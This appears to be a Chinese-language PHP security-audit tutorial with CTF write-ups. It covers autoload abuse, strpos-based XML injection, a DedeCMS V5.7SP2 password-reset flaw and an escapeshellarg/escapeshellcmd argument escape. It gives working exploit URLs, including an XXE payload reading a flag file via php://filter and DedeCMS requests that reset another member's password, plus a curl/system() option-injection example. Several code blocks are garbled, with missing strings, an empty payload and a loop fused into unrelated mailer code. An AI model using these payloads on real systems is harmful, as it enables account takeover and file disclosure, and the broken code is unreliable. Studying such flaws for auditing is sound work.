    class NotFound{
        function __construct()
        {
            die('404');
        }
    }
    spl_autoload_register(
        function ($class){
            new NotFound();
        }
    );
    $classname = isset($_GET['name']) ? $_GET['name'] : null;
    $param = isset($_GET['param']) ? $_GET['param'] : null;
    $param2 = isset($_GET['param2']) ? $_GET['param2'] : null;
    if(class_exists($classname)){
        $newclass = new $classname($param,$param2);
        var_dump($newclass);
        foreach ($newclass as $key=>$value)
            echo $key.'=>'.$value.'';
    }
**当class_exists时，调用 **autoload方法，但是**
autoload方法不存在，新建了一个spl_autoload_register方法，类似__autoload方法**
  * 列出文件（GlobIterator类）
    public GlobIterator::__construct ( string $pattern [, int $flags = FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO ] )
**第一个参数为要搜索的文件名，第二个参数为第二个参数为选择文件的哪个信息作为键名**
  * payload
    http://127.0.0.1:8888/index.php?name=GlobIterator&param=./*.php&param2=0
  * 读取flag
    http://127.0.0.1:8888/index.php?name=SimpleXMLElement&param=%3C?xml%20version=%221.0%22?%3E%3C!DOCTYPE%20ANY%20[%3C!ENTITY%20xxe%20SYSTEM%20%22php://filter/read=convert.base64-encode/resource=f1agi3hEre.php%22%3E]%3E%3Cx%3E%26xxe;%3C/x%3E&param2=2
  * 参考
    https://www.php.net/manual/en/function.spl-autoload-register.php
## strpos使用不当引发漏洞
### False Beard
  * code
    class Login {
      public function __construct($user, $pass) {
        $this->loginViaXml($user, $pass);
      }
      public function loginViaXml($user, $pass) {
        if (
          (!strpos($user, '')) &&
          (!strpos($pass, ''))
        ) {
          $format = '' .
            '';
          $xml = sprintf($format, $user, $pass);
          $xmlElement = new SimpleXMLElement($xml);
          // Perform the actual login.
          $this->login($xmlElement);
        }
      }
    }
    new Login($_POST['username'], $_POST['password']);
  * strpos 
    主要是用来查找字符在字符串中首次出现的位置。
**查找代码中是否含有
的特殊符号，strpos在没找到指定字符时会返回flase，如果第一个字符找到就返回0，0的取反为1，就可以注入xml进行注入了**
  * payload
    user=
### DeDecms V5.7SP2任意密码重置漏洞
  * 环境搭建
  * 开启会员登陆并且注册两个会员
  * member/resetpassword.php:75 漏洞触发点
    else if($dopost == "safequestion")
    {
        $mid = preg_replace("#[^0-9]#", "", $id);
        $sql = "SELECT safequestion,safeanswer,userid,email FROM #@__member WHERE mid = '$mid'";
        $row = $db->GetOne($sql);
        if(empty($safequestion)) $safequestion = '';
        if(empty($safeanswer)) $safeanswer = '';
        if($row['safequestion'] == $safequestion && $row['safeanswer'] == $safeanswer)
        {
            sn($mid, $row['userid'], $row['email'], 'N');
            exit();
        }
        else
        {
            ShowMsg("对不起，您的安全问题或答案回答错误","-1");
            exit();
        }
    }
**将传入的mid进行查询，查询用户查询对应用户的安全问题、安全答案、用户id、电子邮件等信息，然后当安全问题和答案不为空且等于之前的设置的问题和答案的时候，进入sn函数**
  * 查看数据表
**当没设置问题答案时，safequestion为0，safeanswer为null，语句变为了**
    if($row['safequestion'] == $safequestion && $row['safeanswer'] == $safeanswer)
    $row['safequestion'] == 0 
    $row['safeanswer'] == null
    if ('0' == ''& null == ''){
        sn()
    }
     if(false && true)
  * member/inc/inc_pwd_functions.php:150
  * member/inc/inc_pwd_functions.php:73
**进入newmail函数**
**如果$send == 'N'则发送重置邮件**
    sendmail($mailto,$mailtitle,$mailbody,$headers);
    /resetpassword.php?dopost=getpasswd&amp;id=".$mid."&amp;key=".$randval
  * member/resetpassword.php:96
**如果$id为空则退出，如果row不为空，则执行**
    if(empty($setp))
        {
            $tptim= (60*60*24*3);
            $dtime = time();
            if($dtime - $tptim > $row['mailtime'])
            {
                $db->executenonequery("DELETE FROM `#@__pwd_tmp` WHERE `md` = '$id';");
                ShowMsg("对不起，临时密码修改期限已过期","login.php");
                exit();
            }
            require_once(dirname(__FILE__)."/templets/resetpassword2.htm");
        }
  * member/templets/resetpassword2.htm:95
    " />
**将setp的属性设置为2**
  * member/resetpassword.php:123
    elseif($setp == 2) 
        {
            if(isset($key)) $pwdtmp = $key;
            $sn = md5(trim($pwdtmp));
            if($row['pwd'] == $sn)
            {
                if($pwd != "")
                {
                    if($pwd == $pwdok)
                    {
                        $pwdok = md5($pwdok);
                        $sql = "DELETE FROM `#@__pwd_tmp` WHERE `mid` = '$id';";
                        $db->executenonequery($sql);
                        $sql = "UPDATE `#@__member` SET `pwd` = '$pwdok' WHERE `mid` = '$id';";
                        if($db->executenonequery($sql))
                        {
                            showmsg('更改密码成功，请牢记新密码', 'login.php');
                            exit;
                        }
                    }
                }
                showmsg('对不起，新密码为空或填写不一致', '-1');
                exit;
            }
            showmsg('对不起，临时密码错误', '-1');
            exit;
        }
**如果key等于$row['pwd']，则重置密码成功**
#### 漏洞验证
  * 访问重置密码链接获取key
    member/resetpassword.php?dopost=safequestion&safequestion=0.0&safeanswer=&id=3
  * 重置密码
    member/resetpassword.php?dopost=getpasswd&id=3&key=VeRkLvEU
### CTF
  * 环境搭建
  * buy.php
  * bug.js
    function buy(){
        $('#wait').show();
        $('#result').hide();
        var input = $('#numbers')[0];
        if(input.validity.valid){
            var numbers = input.value;
            $.ajax({
              method: "POST",
              url: "api.php",
              dataType: "json",
              contentType: "application/json", 
              data: JSON.stringify({ action: "buy", numbers: numbers })
            }).done(function(resp){
                if(resp.status == 'ok'){
                    show_result(resp);
                } else {
                    alert(resp.msg);
                }
            })
        } else {
            alert('invalid');
        }
        $('#wait').hide();
    }
**将用户提交的数字传入到api.php的buy函数**
  * api.php
    for($i=0; $isanitize($data['to']);
        }
        if (!isset($data['from'])) {
          $data['from'] = 'PI:EMAIL';
        } else {
          $data['from'] = $this->sanitize($data['from']);
        }
        if (!isset($data['subject'])) {
          $data['subject'] = 'No Subject';
        }
        if (!isset($data['message'])) {
          $data['message'] = '';
        }
        mail($data['to'], $data['subject'], $data['message'],
          '', "-f" . $data['from']);
      }
    }
    $mailer = new Mailer();
    $mailer->send($_POST);
**新建一个MAil类进行邮件发送**
  * Php内置函数mail
    bool mail (
        string $to , 接收人
        string $subject , 邮件标题
        string $message [, 征文
        string $additional_headers [, 额外头部
        string $additional_parameters ]] 额外参数
    )
  * Linux中的额外参数
    -O option = value
    QueueDirectory = queuedir 选择队列消息
    -X logfile
    这个参数可以指定一个目录来记录发送邮件时的详细日志情况。
    -f from email
    这个参数可以让我们指定我们发送邮件的邮箱地址。
  * 举个例子（原文图）
  * 结果
    17220 
     17220  filter_var() 问题在于，我们在双引号中嵌套转义空格仍然能够通过检测。同时由于底层正则表达式的原因，我们通过重叠单引号和双引号，欺骗
> filter_val() 使其认为我们仍然在双引号中，这样我们就可以绕过检测。
    ”aaa’aaa”@example.com
  * escapeshellcmd() 和 escapeshellarg()（会造成特殊字符逃逸）
  * 逃逸过程分析
    $param = "127.0.0.1' -v -d a=1";
    $a = escapeshellcmd($param);
    $b = escapeshellarg($a);
    $cmd = "curl".$b;
    var_dump($a)."\n";
    var_dump($b)."\n";
    var_dump($cmd)."\n";
    system($cmd);
**传入127.0.0.1' -v -d a=1，escapeshellarg首先进行转义，处理为'127.0.0.1'\'' -v -d
a=1'，接着escapeshellcmd处理，处理结果为'127.0.0.1'\'' -v -d a=1\',\ 被解释成了 \ 而不再是转义字符**
#### 参考
    https://www.leavesongs.com/PENETRATION/some-tricks-of-attacking-lnmp-web-application.html
## 正则使用不当导致的路径穿越问题
### Frost Pattern
  * code
    class TokenStorage {
      public function performAction($action, $data) {
        switch ($action) {
          case 'create':
            $this->createToken($data);
            break;
          case 'delete':
            $this->clearToken($data);
            break;
          default:
            throw new Exception('Unknown action');
        }
      }